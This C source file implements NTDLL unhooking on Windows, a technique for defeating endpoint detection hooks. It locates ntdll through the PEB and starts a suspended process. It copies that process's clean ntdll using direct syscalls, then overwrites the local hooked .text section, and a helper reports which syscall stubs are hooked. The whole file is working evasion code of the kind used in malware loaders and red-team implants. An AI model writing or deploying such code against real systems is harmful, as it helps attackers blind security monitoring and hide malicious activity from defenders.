/*
 *  ~ unhook.c ~
 * NTDLL Unhooking
 * Author: jakobfriedl
 */

#include "base.h"

SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

    // Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'SuspendedProcessUnhooking.exe')
    // 0x10 is = sizeof(LIST_ENTRY)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return pLdr->DllBase;
}

BOOL ReadNtdllFromSuspendedProcess(IN PNTAPI_FUNC Nt, OUT PVOID* ppNtdllBuf) {

    NTSTATUS STATUS = NULL; 

    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cProcessPath[MAX_PATH] = { 0 };

    PVOID pNtdllModule = FetchLocalNtdllBaseAddress();
    PBYTE pNtdllBuffer = NULL;
    SIZE_T sNtdllSize = NULL;
    SIZE_T sNumberOfBytesRead = NULL;

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION	Pi = { 0 };

    HANDLE hProcess = NULL; 
    HANDLE hThread = NULL;

    // cleaning the structs (setting elements values to 0)
    ZeroMemoryEx(&Si, sizeof(STARTUPINFO));
    ZeroMemoryEx(&Pi, sizeof(PROCESS_INFORMATION));

    // setting the size of the structure
    Si.cb = sizeof(STARTUPINFO);

    // Use NtCreateUserProcess to create a suspended process
    INFO_W(L"Creating suspended process %s...", TARGET_PROCESS); 
    if (!NtCreateSuspendedProcess(Nt, TARGET_PROCESS, PROCESS_PARAMS, PROCESS_PATH, &hProcess, &hThread)) {
        PRINT_ERROR("NtCreateSuspendedProcess"); 
        goto CLEANUP; 
    }
    OKAY("[ %d ] Suspended process created", GetProcessId(hProcess)); 

    // allocating enough memory to read ntdll from the remote process
    sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
    if (!sNtdllSize)
        goto CLEANUP;

    pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
    if (!pNtdllBuffer)
        goto CLEANUP;

    // reading ntdll.dll (replace ReadProcessMemory with NtReadVirtualMemory)
    SET_SYSCALL(Nt->NtReadVirtualMemory);
    STATUS = RunSyscall(hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead); 
    if (STATUS != STATUS_SUCCESS || sNumberOfBytesRead != sNtdllSize) {
        PRINT_NTERROR("NtReadVirtualMemory"); 
        goto CLEANUP;
    }

    *ppNtdllBuf = pNtdllBuffer;

    // terminating the process (replace with NtResumeThread and NtTerminateProcess)
    SET_SYSCALL(Nt->NtResumeThread);
    STATUS = RunSyscall(hThread, NULL);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtResumeThread");  
    }

    SET_SYSCALL(Nt->NtTerminateProcess);
    STATUS = RunSyscall(hProcess, 0); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtTerminateProcess");
    }

CLEANUP:
    if (Pi.hProcess) {
        SET_SYSCALL(Nt->NtClose); 
        STATUS = RunSyscall(hProcess);
    }
    
    if (Pi.hThread) {
        SET_SYSCALL(Nt->NtClose); 
        STATUS = RunSyscall(hThread); 
    }
    
    if (!(*ppNtdllBuf))
        return FALSE;
    else
        return TRUE;
}

BOOL ReplaceNtdllTxtSection(IN PNTAPI_FUNC Nt, IN PVOID pUnhookedNtdll) {

    NTSTATUS STATUS = NULL; 

    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

    // INFO("[ 0x%p ] Ntdll base address (Hooked)", pLocalNtdll);
    // INFO("[ 0x%p ] Ntdll base address (Unhooked)", pUnhookedNtdll);

    // Getting the DOS header
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // Getting the NT headers
    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    PVOID pLocalNtdllTxt = NULL;	// local hooked text section base address
    PVOID pRemoteNtdllTxt = NULL;   // the unhooked text section base address
    SIZE_T sNtdllTxtSize = NULL;	// the size of the text section
    // getting the text section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

        // the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    // INFO("[ 0x%p ] Ntdll .text section address (Hooked)", pLocalNtdllTxt); 
    // INFO("[ 0x%p ] [ %d ] Ntdll .text section address (Unhooked)", pRemoteNtdllTxt, sNtdllTxtSize);

    // small check to verify that all the required information is retrieved
    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;

    // small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
        return FALSE;

    INFO("Replacing the .text section...");
    DWORD dwOldProtection = NULL;

    // Replace with NtProtectVirtualMemory
    SET_SYSCALL(Nt->NtProtectVirtualMemory); 
    STATUS = RunSyscall((HANDLE)-1, &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection); 
    if (STATUS != STATUS_SUCCESS) {
        PRINT_NTERROR("NtProtectVirtualMemory [1]"); 
        return FALSE;
    }

    CopyMemoryEx(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // Replace with NtProtectVirtualMemory
    SET_SYSCALL(Nt->NtProtectVirtualMemory);
    STATUS = RunSyscall((HANDLE)-1, &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
    if (STATUS != STATUS_SUCCESS) {
        PRINT_ERROR("NtProtectVirtualMemory [2]");
        return FALSE;
    }

    return TRUE;
}

VOID CheckHookState(char* cSyscallName, PVOID pSyscallAddress) {
    INFO("Checking %s ---> %s", cSyscallName, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[HOOKED]" : "[UNHOOKED]");
}